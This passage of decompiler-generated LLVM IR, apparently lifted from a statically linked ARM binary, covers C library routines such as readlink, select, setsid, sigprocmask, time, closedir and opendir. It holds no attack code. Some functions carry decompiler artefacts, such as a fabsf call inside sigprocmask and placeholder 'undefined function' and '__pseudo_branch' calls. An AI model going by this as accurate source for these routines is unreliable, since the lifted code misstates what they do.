  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1302c, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13038 = load i32, i32* @r7, align 4
  store i32 %v3_13038, i32* %stack_var_-8, align 4
  %v0_13044 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13044, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13044, -4095
  br i1 %tmp, label %dec_label_pc_1306c, label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %entry
  %v0_13058 = call i32 @__aeabi_read_tp()
  %v3_1305c = load i16, i16* @global_var_244d0.762, align 2
  %v4_1305c = sext i16 %v3_1305c to i32
  %v0_13060 = load i32, i32* %r2.global-to-local, align 4
  %v1_13060 = sub i32 0, %v0_13060
  store i32 %v1_13060, i32* %r2.global-to-local, align 4
  %v3_13064 = add i32 %v4_1305c, %v0_13058
  %v4_13064 = inttoptr i32 %v3_13064 to i32*
  store i32 %v1_13060, i32* %v4_13064, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1306c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %entry, %dec_label_pc_13054
  %v1_13070 = phi i32 [ %v0_13044, %entry ], [ -1, %dec_label_pc_13054 ]
  %v2_1306c = phi i32 [ %v3_13038, %entry ], [ %v2_1306c.pre, %dec_label_pc_13054 ]
  store i32 %v2_1306c, i32* @r7, align 4
  ret i32 %v1_13070

; uselistorder directives
  uselistorder i32 %v0_13044, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1306c, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13078 = load i32, i32* @r4, align 4
  store i32 %v3_13078, i32* %stack_var_-12, align 4
  %v0_13088 = load i32, i32* @r0, align 4
  store i32 %v0_13088, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13088, -4095
  br i1 %tmp, label %dec_label_pc_130b0, label %dec_label_pc_13098

dec_label_pc_13098:                               ; preds = %entry
  %v0_1309c = call i32 @__aeabi_read_tp()
  %v3_130a0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_130a0 = sext i16 %v3_130a0 to i32
  %v0_130a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_130a4 = sub i32 0, %v0_130a4
  store i32 %v1_130a4, i32* %r2.global-to-local, align 4
  %v3_130a8 = add i32 %v4_130a0, %v0_1309c
  %v4_130a8 = inttoptr i32 %v3_130a8 to i32*
  store i32 %v1_130a4, i32* %v4_130a8, align 4
  %v2_130b0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_130b0

dec_label_pc_130b0:                               ; preds = %entry, %dec_label_pc_13098
  %v1_130b4 = phi i32 [ %v0_13088, %entry ], [ -1, %dec_label_pc_13098 ]
  %v2_130b0 = phi i32 [ %v3_13078, %entry ], [ %v2_130b0.pre, %dec_label_pc_13098 ]
  store i32 %v2_130b0, i32* @r4, align 4
  ret i32 %v1_130b4

; uselistorder directives
  uselistorder i32 %v0_13088, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130b0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_130bc = load i32, i32* @r4, align 4
  store i32 %v3_130bc, i32* %stack_var_-28, align 4
  %v6_130bc = load i32, i32* @r5, align 4
  %v9_130bc = load i32, i32* @r6, align 4
  %v12_130bc = load i32, i32* @r7, align 4
  %v15_130bc = load i32, i32* @r8, align 4
  %v18_130bc = load i32, i32* @sl, align 4
  %v21_130bc = load i32, i32* @lr, align 4
  %v4_130cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_130d4 = icmp eq i32 %v4_130cc, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_130d4, label %dec_label_pc_130f0, label %entry.dec_label_pc_130fc_crit_edge

entry.dec_label_pc_130fc_crit_edge:               ; preds = %entry
  br label %dec_label_pc_130fc

dec_label_pc_130f0:                               ; preds = %entry
  store i32 %v3_130bc, i32* @r4, align 4
  store i32 %v9_130bc, i32* @r6, align 4
  store i32 %v12_130bc, i32* @r7, align 4
  store i32 %v15_130bc, i32* @r8, align 4
  store i32 %v18_130bc, i32* %sl.global-to-local, align 4
  %v0_130f8 = call i32 @__syscall_select()
  br label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %entry.dec_label_pc_130fc_crit_edge, %dec_label_pc_130f0
  %v0_130fc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_130fc, i32* @r5, align 4
  %v0_13110 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_13110, i32* @r0, align 4
  %v0_13118 = call i32 @__syscall_select()
  store i32 %v0_13118, i32* @r4, align 4
  %v0_13120 = load i32, i32* @r5, align 4
  %v1_13124 = call i32 @__libc_disable_asynccancel(i32 %v0_13120)
  %v0_13128 = load i32, i32* @r4, align 4
  %v2_13130 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_13130, i32* @r4, align 4
  store i32 %v6_130bc, i32* @r5, align 4
  store i32 %v9_130bc, i32* @r6, align 4
  store i32 %v12_130bc, i32* @r7, align 4
  store i32 %v15_130bc, i32* @r8, align 4
  store i32 %v18_130bc, i32* @sl, align 4
  store i32 %v21_130bc, i32* @lr, align 4
  ret i32 %v0_13128

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130fc, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13140 = load i32, i32* @r7, align 4
  store i32 %v3_13140, i32* %stack_var_-8, align 4
  %v0_1314c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1314c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1314c, -4095
  br i1 %tmp, label %dec_label_pc_13174, label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %entry
  %v0_13160 = call i32 @__aeabi_read_tp()
  %v3_13164 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13164 = sext i16 %v3_13164 to i32
  %v0_13168 = load i32, i32* %r2.global-to-local, align 4
  %v1_13168 = sub i32 0, %v0_13168
  store i32 %v1_13168, i32* %r2.global-to-local, align 4
  %v3_1316c = add i32 %v4_13164, %v0_13160
  %v4_1316c = inttoptr i32 %v3_1316c to i32*
  store i32 %v1_13168, i32* %v4_1316c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13174.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13174

dec_label_pc_13174:                               ; preds = %entry, %dec_label_pc_1315c
  %v1_13178 = phi i32 [ %v0_1314c, %entry ], [ -1, %dec_label_pc_1315c ]
  %v2_13174 = phi i32 [ %v3_13140, %entry ], [ %v2_13174.pre, %dec_label_pc_1315c ]
  store i32 %v2_13174, i32* @r7, align 4
  ret i32 %v1_13178

; uselistorder directives
  uselistorder i32 %v0_1314c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13174, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_13184 = icmp eq i32* %arg2, null
  br i1 %v2_13184, label %dec_label_pc_131c8, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %entry
  %v2_13198 = load i32, i32* %arg2, align 4
  %v1_1319c = icmp slt i32 %v2_13198, 0
  br i1 %v1_1319c, label %dec_label_pc_131b0, label %dec_label_pc_131a4

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13198
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_131a4 = load i32, i32* %.pre3, align 4
  %v1_131a8 = urem i32 %v3_131a4, 2
  %v2_131a8 = icmp eq i32 %v1_131a8, 0
  br i1 %v2_131a8, label %dec_label_pc_131c8, label %dec_label_pc_131b0

dec_label_pc_131b0:                               ; preds = %dec_label_pc_13198, %dec_label_pc_131a4
  %v2_131b0 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_131b0 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_131c8

dec_label_pc_131c8:                               ; preds = %dec_label_pc_131a4, %entry, %dec_label_pc_131b0
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_131fc, label %dec_label_pc_131e4

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131c8
  %v1_131e8 = sub i32 0, %arg1
  %v3_131ec = load i16, i16* @global_var_244d0.762, align 2
  %v4_131ec = sext i16 %v3_131ec to i32
  %v0_131f0 = call i32 @__aeabi_read_tp()
  %v3_131f4 = add i32 %v4_131ec, %v0_131f0
  %v4_131f4 = inttoptr i32 %v3_131f4 to i32*
  store i32 %v1_131e8, i32* %v4_131f4, align 4
  br label %dec_label_pc_131fc

dec_label_pc_131fc:                               ; preds = %dec_label_pc_131c8, %dec_label_pc_131e4
  %v1_13204 = phi i32 [ %arg1, %dec_label_pc_131c8 ], [ -1, %dec_label_pc_131e4 ]
  ret i32 %v1_13204

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_131fc, { 1, 0 }
  uselistorder label %dec_label_pc_131c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131b0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_13210 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_13220 = call i32 @gettimeofday(i32 %v2_13210, i32 0)
  %v2_13224 = load i32, i32* %stack_var_-16, align 4
  %v2_13228 = icmp eq i32* %arg1, null
  br i1 %v2_13228, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_13224, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_13224

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1323c = load i32, i32* @r4, align 4
  store i32 %v3_1323c, i32* %stack_var_-24, align 4
  %v9_1323c = load i32, i32* @r6, align 4
  %v12_1323c = load i32, i32* @r7, align 4
  %v15_1323c = load i32, i32* @r8, align 4
  %v18_1323c = load i32, i32* @lr, align 4
  %v2_13240 = load i32, i32* %arg1, align 4
  store i32 %v2_13240, i32* %r3.global-to-local, align 4
  %v3_13248 = icmp eq i32 %v2_13240, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r6, align 4
  br i1 %v3_13248, label %dec_label_pc_1325c, label %dec_label_pc_13278

dec_label_pc_1325c:                               ; preds = %entry
  store i32 70244, i32* %r2.global-to-local, align 4
  %v0_13260 = call i32 @__aeabi_read_tp()
  %v3_13264 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13264 = sext i16 %v3_13264 to i32
  store i32 %v4_13264, i32* %r2.global-to-local, align 4
  %v0_13268 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13268, i32* %r1.global-to-local, align 4
  %v1_1326c = add i32 %v0_13268, 10
  store i32 %v1_1326c, i32* %r3.global-to-local, align 4
  %v3_13270 = add i32 %v4_13264, %v0_13260
  %v4_13270 = inttoptr i32 %v3_13270 to i32*
  store i32 %v1_1326c, i32* %v4_13270, align 4
  %v0_13320.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13320

dec_label_pc_13278:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_1327c = add i32 %tmp, 24
  store i32 %v1_1327c, i32* %r2.global-to-local, align 4
  %v4_13284 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 68) to i32*), align 4
  store i32 %v4_13284, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13290 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13290)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_132a8 = load i32, i32* @r6, align 4
  %v2_132a8 = add i32 %v0_132a8, 16
  %v3_132a8 = inttoptr i32 %v2_132a8 to i32*
  %v4_132a8 = load i32, i32* %v3_132a8, align 4
  call void @__pseudo_branch(i32 %v4_132a8)
  %v0_132b4 = load i32, i32* @r7, align 4
  %v1_132b4 = inttoptr i32 %v0_132b4 to i32*
  %v2_132b4 = load i32, i32* %v1_132b4, align 4
  store i32 %v2_132b4, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_132c4 = load i32, i32* @r8, align 4
  store i32 %v0_132c4, i32* %v1_132b4, align 4
  %v0_132c8 = load i32, i32* @r6, align 4
  %v1_132c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_132c8 = add i32 %v1_132c8, %v0_132c8
  %v3_132c8 = inttoptr i32 %v2_132c8 to i32*
  %v4_132c8 = load i32, i32* %v3_132c8, align 4
  store i32 ptrtoint (i32* @global_var_132d4.790 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_132c8)
  %v0_132d4 = load i32, i32* @r7, align 4
  %v1_132d4 = add i32 %v0_132d4, 12
  %v2_132d4 = inttoptr i32 %v1_132d4 to i32*
  %v3_132d4 = load i32, i32* %v2_132d4, align 4
  store i32 %v3_132d4, i32* @r0, align 4
  %v0_132d8 = call i32 @free()
  %v0_132dc = load i32, i32* @r7, align 4
  store i32 %v0_132dc, i32* @r0, align 4
  %v0_132e0 = call i32 @free()
  %v0_132e8 = load i32, i32* @r4, align 4
  store i32 %v0_132e8, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_132e8, -4095
  br i1 %tmp11, label %dec_label_pc_1331c, label %dec_label_pc_13304

dec_label_pc_13304:                               ; preds = %dec_label_pc_13278
  store i32 70076, i32* %r3.global-to-local, align 4
  %v0_13308 = call i32 @__aeabi_read_tp()
  %v3_1330c = load i16, i16* @global_var_244d0.762, align 2
  %v4_1330c = sext i16 %v3_1330c to i32
  store i32 %v4_1330c, i32* %r3.global-to-local, align 4
  %v0_13310 = load i32, i32* %r2.global-to-local, align 4
  %v1_13310 = sub i32 0, %v0_13310
  store i32 %v1_13310, i32* %r2.global-to-local, align 4
  %v3_13314 = add i32 %v4_1330c, %v0_13308
  %v4_13314 = inttoptr i32 %v3_13314 to i32*
  store i32 %v1_13310, i32* %v4_13314, align 4
  %v0_13318 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1331c

dec_label_pc_1331c:                               ; preds = %dec_label_pc_13278, %dec_label_pc_13304
  %v0_1331c = phi i32 [ %v0_132e8, %dec_label_pc_13278 ], [ %v0_13318, %dec_label_pc_13304 ]
  store i32 %v0_1331c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %dec_label_pc_1325c, %dec_label_pc_1331c
  %v0_13320 = phi i32 [ %v0_13320.pre, %dec_label_pc_1325c ], [ %v0_1331c, %dec_label_pc_1331c ]
  %v2_13328 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13328, i32* @r4, align 4
  store i32 %v9_1323c, i32* @r6, align 4
  store i32 %v12_1323c, i32* @r7, align 4
  store i32 %v15_1323c, i32* @r8, align 4
  store i32 %v18_1323c, i32* @lr, align 4
  ret i32 %v0_13320

; uselistorder directives
  uselistorder i32 %v0_132e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13320, { 1, 0 }
  uselistorder label %dec_label_pc_1331c, { 1, 0 }
}

define i32 @function_13338(i32 %arg1, i16* %arg2) local_unnamed_addr {
dec_label_pc_13338:
  %v0_13338 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13338, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13338
  %tmp = ptrtoint i16* %arg2 to i32
  %v3_13348 = trunc i32 %tmp to i16
  store i16 %v3_13348, i16* %arg2, align 2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13338, %bb
  %v11_13348 = phi i32 [ %arg1, %dec_label_pc_13338 ], [ 0, %bb ]
  ret i32 %v11_13348

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1334c = load i32, i32* @r4, align 4
  %v6_1334c = load i32, i32* @r5, align 4
  %v9_1334c = load i32, i32* @r6, align 4
  %v12_1334c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_13360 = call i32 @malloc()
  %v2_13368 = icmp eq i32 %v0_13360, 0
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r6, align 4
  br i1 %v2_13368, label %bb, label %dec_label_pc_13378

bb:                                               ; preds = %entry
  br label %dec_label_pc_13404

dec_label_pc_13378:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1337c = load i32, i32* @r4, align 4
  %v2_1337c = icmp ugt i32 %v0_1337c, 511
  %v2_13380 = add i32 %v0_13360, 4
  %v3_13380 = inttoptr i32 %v2_13380 to i32*
  store i32 0, i32* %v3_13380, align 4
  %v0_13384 = load i32, i32* %r3.global-to-local, align 4
  %v2_13384 = add i32 %v0_13360, 16
  %v3_13384 = inttoptr i32 %v2_13384 to i32*
  store i32 %v0_13384, i32* %v3_13384, align 4
  %v0_13388 = load i32, i32* %r3.global-to-local, align 4
  %v2_13388 = add i32 %v0_13360, 8
  %v3_13388 = inttoptr i32 %v2_13388 to i32*
  store i32 %v0_13388, i32* %v3_13388, align 4
  br i1 %v2_1337c, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_13378
  %v0_133902 = load i32, i32* @r4, align 4
  %v2_133903 = add i32 %v0_13360, 20
  %v3_133904 = inttoptr i32 %v2_133903 to i32*
  store i32 %v0_133902, i32* %v3_133904, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_13378
  %v1_1338c = load i32, i32* %r3.global-to-local, align 4
  %v2_1338c = add i32 %v1_1338c, 512
  store i32 %v2_1338c, i32* %r3.global-to-local, align 4
  %v0_13390 = load i32, i32* @r4, align 4
  %v2_13390 = add i32 %v0_13360, 20
  %v3_13390 = inttoptr i32 %v2_13390 to i32*
  store i32 %v0_13390, i32* %v3_13390, align 4
  %v1_13394 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_13394, i32* %v3_13390, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_13360, i32* @r5, align 4
  %v0_1339c = load i32, i32* @r7, align 4
  %v2_1339c = inttoptr i32 %v0_13360 to i32*
  store i32 %v0_1339c, i32* %v2_1339c, align 4
  %v0_133a0 = load i32, i32* @r5, align 4
  %v1_133a0 = add i32 %v0_133a0, 20
  %v2_133a0 = inttoptr i32 %v1_133a0 to i32*
  %v3_133a0 = load i32, i32* %v2_133a0, align 4
  store i32 %v3_133a0, i32* %r1.global-to-local, align 4
  %v2_133a8 = call i32 @calloc(i32 1, i32 %v3_133a0)
  %v2_133ac = icmp eq i32 %v2_133a8, 0
  store i32 %v2_133a8, i32* @r4, align 4
  %v1_133b4 = load i32, i32* @r5, align 4
  %v2_133b4 = add i32 %v1_133b4, 12
  %v3_133b4 = inttoptr i32 %v2_133b4 to i32*
  store i32 %v2_133a8, i32* %v3_133b4, align 4
  br i1 %v2_133ac, label %dec_label_pc_133bc, label %dec_label_pc_133cc

dec_label_pc_133bc:                               ; preds = %bb17
  %v0_133bc = load i32, i32* @r5, align 4
  store i32 %v0_133bc, i32* @r0, align 4
  %v0_133c0 = call i32 @free()
  %v0_133c4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13404

dec_label_pc_133cc:                               ; preds = %bb17
  %v0_133d0 = load i32, i32* @r6, align 4
  %v2_133d0 = add i32 %v0_133d0, -34032
  store i32 %v2_133d0, i32* %r3.global-to-local, align 4
  %v1_133d8 = inttoptr i32 %v2_133d0 to i32*
  %v2_133d8 = load i32, i32* %v1_133d8, align 4
  %v3_133d8 = add i32 %v0_133d0, -34028
  %v4_133d8 = inttoptr i32 %v3_133d8 to i32*
  %v5_133d8 = load i32, i32* %v4_133d8, align 4
  store i32 %v5_133d8, i32* %r1.global-to-local, align 4
  %v6_133d8 = add i32 %v0_133d0, -34024
  %v7_133d8 = inttoptr i32 %v6_133d8 to i32*
  %v8_133d8 = load i32, i32* %v7_133d8, align 4
  store i32 %v8_133d8, i32* %r2.global-to-local, align 4
  %v9_133d8 = add i32 %v0_133d0, -34020
  %v10_133d8 = inttoptr i32 %v9_133d8 to i32*
  %v11_133d8 = load i32, i32* %v10_133d8, align 4
  store i32 %v11_133d8, i32* %r3.global-to-local, align 4
  %v12_133d8 = add i32 %v0_133d0, -34016
  %v1_133e4 = inttoptr i32 %v12_133d8 to i32*
  %v2_133e4 = load i32, i32* %v1_133e4, align 4
  %v3_133e4 = add i32 %v0_133d0, -34012
  %v4_133e4 = inttoptr i32 %v3_133e4 to i32*
  %v5_133e4 = load i32, i32* %v4_133e4, align 4
  store i32 %v2_133e4, i32* %stack_var_-32, align 4
  store i32 %v5_133d8, i32* %r1.global-to-local, align 4
  store i32 %v8_133d8, i32* %r2.global-to-local, align 4
  store i32 %v11_133d8, i32* %r3.global-to-local, align 4
  %v0_133f4 = load i32, i32* @r5, align 4
  %v1_133f4 = add i32 %v0_133f4, 24
  %v1_133f8 = inttoptr i32 %v1_133f4 to i32*
  store i32 %v2_133d8, i32* %v1_133f8, align 4
  %v3_133f8 = add i32 %v0_133f4, 28
  %v4_133f8 = inttoptr i32 %v3_133f8 to i32*
  %v5_133f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_133f8, i32* %v4_133f8, align 4
  %v6_133f8 = add i32 %v0_133f4, 32
  %v7_133f8 = inttoptr i32 %v6_133f8 to i32*
  %v8_133f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_133f8, i32* %v7_133f8, align 4
  %v9_133f8 = add i32 %v0_133f4, 36
  %v10_133f8 = inttoptr i32 %v9_133f8 to i32*
  %v11_133f8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_133f8, i32* %v10_133f8, align 4
  %v12_133f8 = add i32 %v0_133f4, 40
  %v2_133fc = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_133e4, i32* %r1.global-to-local, align 4
  %v1_13400 = inttoptr i32 %v12_133f8 to i32*
  store i32 %v2_133fc, i32* %v1_13400, align 4
  %v3_13400 = add i32 %v0_133f4, 44
  %v4_13400 = inttoptr i32 %v3_13400 to i32*
  %v5_13400 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13400, i32* %v4_13400, align 4
  %v0_13404.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13404

dec_label_pc_13404:                               ; preds = %bb, %dec_label_pc_133bc, %dec_label_pc_133cc
  %v0_13404 = phi i32 [ 0, %bb ], [ %v0_133c4, %dec_label_pc_133bc ], [ %v0_13404.pre, %dec_label_pc_133cc ]
  store i32 %v3_1334c, i32* @r4, align 4
  store i32 %v6_1334c, i32* @r5, align 4
  store i32 %v9_1334c, i32* @r6, align 4
  store i32 %v12_1334c, i32* @r7, align 4
  ret i32 %v0_13404

; uselistorder directives
  uselistorder i32 %v2_133a8, { 1, 0, 2 }
  uselistorder i32 %v0_13360, { 3, 2, 6, 0, 5, 4, 1, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 11, 10, 1, 6, 2, 7, 12, 8, 13, 9, 14, 3, 15, 4, 16, 0, 17, 5, 18 }
  uselistorder label %dec_label_pc_13404, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_1341c = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_13424 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_13454, label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %entry
  %v0_13440 = call i32 @__aeabi_read_tp()
  %v3_13444 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13444 = sext i16 %v3_13444 to i32
  %v0_13448 = load i32, i32* %r2.global-to-local, align 4
  %v1_13448 = sub i32 0, %v0_13448
  store i32 %v1_13448, i32* %r2.global-to-local, align 4
  %v3_1344c = add i32 %v4_13444, %v0_13440
  %v4_1344c = inttoptr i32 %v3_1344c to i32*
  store i32 %v1_13448, i32* %v4_1344c, align 4
  br label %dec_label_pc_13478

dec_label_pc_13454:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_13454 = icmp slt i32 %arg1, 0
  br i1 %v1_13454, label %dec_label_pc_13478, label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13454
  store i32 %v2_13424, i32* @r1, align 4
  %v0_13460 = call i32 @fstat()
  %v1_13464 = icmp slt i32 %v0_13460, 0
  br i1 %v1_13464, label %dec_label_pc_1346c, label %dec_label_pc_13480

dec_label_pc_1346c:                               ; preds = %dec_label_pc_1345c
  br label %dec_label_pc_13478

dec_label_pc_13478:                               ; preds = %dec_label_pc_1346c, %dec_label_pc_13454, %dec_label_pc_1343c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_13480:                               ; preds = %dec_label_pc_1345c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13488 = load i32, i32* @r7, align 4
  %v3_1348c = call i32 @__GI___fcntl_nocancel(i32 %v0_13488, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13494 = load i32, i32* @r7, align 4
  %v2_13498 = call i32 @fd_to_DIR(i32 %v0_13494, i32 %tmp)
  store i32 %v2_13498, i32* %r1.global-to-local, align 4
  %v2_1349c = icmp eq i32 %v2_13498, 0
  br i1 %v2_1349c, label %dec_label_pc_134a4, label %dec_label_pc_134c4

dec_label_pc_134a4:                               ; preds = %dec_label_pc_13480
  %v0_134b4 = call i32 @__aeabi_read_tp()
  %v3_134b8 = load i16, i16* @global_var_244d0.762, align 2
  %v4_134b8 = sext i16 %v3_134b8 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_134c0 = add i32 %v4_134b8, %v0_134b4
  %v4_134c0 = inttoptr i32 %v3_134c0 to i32*
  store i32 12, i32* %v4_134c0, align 4
  %v0_134c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_13480, %dec_label_pc_13478, %dec_label_pc_134a4
  %v0_134c4 = phi i32 [ %v2_13498, %dec_label_pc_13480 ], [ 0, %dec_label_pc_13478 ], [ %v0_134c4.pre, %dec_label_pc_134a4 ]
  store i32 %v3_1341c, i32* @r7, align 4
  ret i32 %v0_134c4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_134c4, { 2, 0, 1 }
}

define i32 @"$d.11"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_134d4:
  %v0_134d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_134d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_134d4
  br label %.thread1

